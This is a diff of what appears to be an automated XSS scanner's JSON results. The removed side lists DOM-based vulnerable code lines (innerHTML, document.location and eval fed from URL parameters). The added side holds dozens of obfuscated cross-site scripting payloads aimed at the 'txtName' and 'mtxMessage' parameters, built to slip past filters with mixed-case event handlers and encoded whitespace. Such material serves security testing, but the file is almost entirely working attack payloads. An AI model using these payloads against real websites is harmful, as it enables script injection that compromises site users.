@@ -1,116 +1,108 @@
 [
   {
-    "vulnerabilities": [
+    "payloads": [
       {
-        "vulnerability": "line : 5   var cS = document.location.search;"
+        "payload": "<dETAILS%09OnToGGLE%0d=%0da=prompt,a()%0dx>"
       },
       {
-        "vulnerability": "line : 6   var sP = new URLSearchParams(cS);"
+        "payload": "<d3V%0dOnMOUsEOVEr%0d=%0dconfirm()%0dx>v3dm0s"
       },
       {
-        "vulnerability": "line : 7   var p25 = sP.get('p25');"
+        "payload": "<HTmL%0donMOusEoVer%0d=%0dconfirm()>"
       },
       {
-        "vulnerability": "line : 8   var p26 = sP.get('p26');"
+        "payload": "<D3V/+/ONMOUSeoVeR%09=%09[8].find(confirm)>v3dm0s"
       },
       {
-        "vulnerability": "line : 9   var p27 = sP.get('p27');"
+        "payload": "<deTaIlS%0doNpoiNTerenter+=+(confirm)()%0dx//"
       },
       {
-        "vulnerability": "line : 12  if (p25 !== null) {"
+        "payload": "<DEtaILS%0aonPoiNTeRENtEr%09=%09(confirm)()%0dx>"
       },
       {
-        "vulnerability": "line : 13  document.getElementById('h1').innerHTML = 'XSS ' + p25;"
+        "payload": "<HTMl%0dOnMoUsEOver%09=%09(prompt)``%0dx//"
       },
       {
-        "vulnerability": "line : 16  if (p26 !== null) {"
+        "payload": "<htmL/+/OnMoUseOVeR%0d=%0d(prompt)``>"
       },
       {
-        "vulnerability": "line : 17  document.location = p26;"
+        "payload": "<hTmL%0dOnMOUseOVER%0d=%0d[8].find(confirm)>"
       },
       {
-        "vulnerability": "line : 20  if (p27 !== null) {"
+        "payload": "<HtmL%0aoNPoINtErEntEr+=+[8].find(confirm)>"
       },
       {
-        "vulnerability": "line : 21  eval('n.p=' + p27.toLowerCase());"
+        "payload": "<D3v%0aOnpoinTEReNtEr%0d=%0dconfirm()%0dx>v3dm0s"
       },
       {
-        "vulnerability": "line : 22  document.getElementById('h1').innerHTML = 'XSS ' + n.p;"
+        "payload": "<HtML%09OnPOiNTeRenTEr%0a=%0a[8].find(confirm)%0dx//"
       },
       {
-        "vulnerability": "line : 3   if (document.location.search.match(\"p30\")) {"
+        "payload": "<hTmL/+/ONPoINTeRENteR%0d=%0d(confirm)()%0dx//"
       },
       {
-        "vulnerability": "line : 4   gym.innerHTML = \"\";"
+        "payload": "<A%09oNMoUSEOVER%09=%09(confirm)()>v3dm0s"
+      },
+      {
+        "payload": "<d3v/+/oNPoinTEREnTER%0d=%0dconfirm()%0dx>v3dm0s"
+      },
+      {
+        "payload": "<DeTAilS/+/onToggLe%0a=%0a(prompt)``%0dx//"
       }
-    ]
+    ],
+    "parameter": "txtName"
   },
   {
     "payloads": [
       {
-        "payload": "\"><a%09oNPointERENter%09=%09(confirm)()%0dx>v3dm0s"
+        "payload": "<A%0dONMousEOVer%0d=%0d(confirm)()%0dx>v3dm0s"
       },
       {
-        "payload": "\"><A%09ONPOinTerEnTER+=+(prompt)``>v3dm0s"
+        "payload": "<D3V%0aoNMOUseoVEr+=+(confirm)()>v3dm0s"
       },
       {
-        "payload": "\"><DeTAILS%09oNpOINterEntEr%0a=%0aconfirm()%0dx//"
+        "payload": "<dETAIlS%0aOnPOinTereNTEr%09=%09[8].find(confirm)//"
       },
       {
-        "payload": "\"><html/+/onpoinTerEnter%0d=%0dconfirm()//"
+        "payload": "<d3v/+/oNpOInTeRENTeR%09=%09a=prompt,a()%0dx>v3dm0s"
+      },
+      {
+        "payload": "<A%0donpoINTErENTER%0d=%0d[8].find(confirm)>v3dm0s"
+      },
+      {
+        "payload": "<D3v/+/oNPoInTEReNTER%0a=%0a(confirm)()%0dx>v3dm0s"
+      },
+      {
+        "payload": "<DEtAILs/+/OnPoiNtERENter%0d=%0da=prompt,a()>"
+      },
+      {
+        "payload": "<a%0aONmoUSEoveR%0a=%0aa=prompt,a()>v3dm0s"
+      },
+      {
+        "payload": "<HTMl%09ONMOUseoVEr%09=%09(confirm)()//"
+      },
+      {
+        "payload": "<D3v%09OnmoUSeOver%09=%09(confirm)()%0dx>v3dm0s"
+      },
+      {
+        "payload": "<dETaIls%0aoNPOIntErEnter%0a=%0a(prompt)``>"
+      },
+      {
+        "payload": "<Html%0aOnpOInTerENter+=+(confirm)()>"
+      },
+      {
+        "payload": "<html/+/oNMoUsEoVER+=+(confirm)()>"
+      },
+      {
+        "payload": "<htmL%0aoNMOuSEovEr+=+a=prompt,a()%0dx//"
+      },
+      {
+        "payload": "<HTMl%0dONMousEOVEr+=+confirm()%0dx>"
+      },
+      {
+        "payload": "<HTML%0aONmouSeOVer%0a=%0aa=prompt,a()%0dx//"
       }
     ],
-    "parameter": "p06"
-  },
-  {
-    "payloads": [
-      {
-        "payload": "'><htML%0dOnmousEOveR%0d=%0d[8].find(confirm)>"
-      },
-      {
-        "payload": "'><A%09OnMOuSeoVer+=+confirm()>v3dm0s"
-      },
-      {
-        "payload": "'><html%0aONPOiNterENTer%09=%09(confirm)()>"
-      },
-      {
-        "payload": "'><d3v%09oNmOuSEOVeR%09=%09confirm()%0dx>v3dm0s"
-      }
-    ],
-    "parameter": "p07"
-  },
-  {
-    "payloads": [
-      {
-        "payload": "\"/+/auTofOCus/+/ONfOCuS=\"confirm()"
-      },
-      {
-        "payload": "\"%0aAUtofOcuS%0aoNFoCUS=\"a=prompt,a()"
-      },
-      {
-        "payload": "\"/+/autofOCus/+/ONFocUS=\"a=prompt,a()"
-      },
-      {
-        "payload": "\"%0daUtOfoCUs%0dOnFocUs=\"(prompt)``"
-      }
-    ],
-    "parameter": "p08"
-  },
-  {
-    "payloads": [
-      {
-        "payload": "'%09AUTOfocuS%09OnfOCUs='confirm()"
-      },
-      {
-        "payload": "'%0dauTofOCus%0donfOcuS='[8].find(confirm)"
-      },
-      {
-        "payload": "'%0aautOfocus%0aonfocuS='[8].find(confirm)"
-      },
-      {
-        "payload": "'/+/aUTofocUS/+/OnFOcus='confirm()"
-      }
-    ],
-    "parameter": "p09"
+    "parameter": "mtxMessage"
   }
 ]
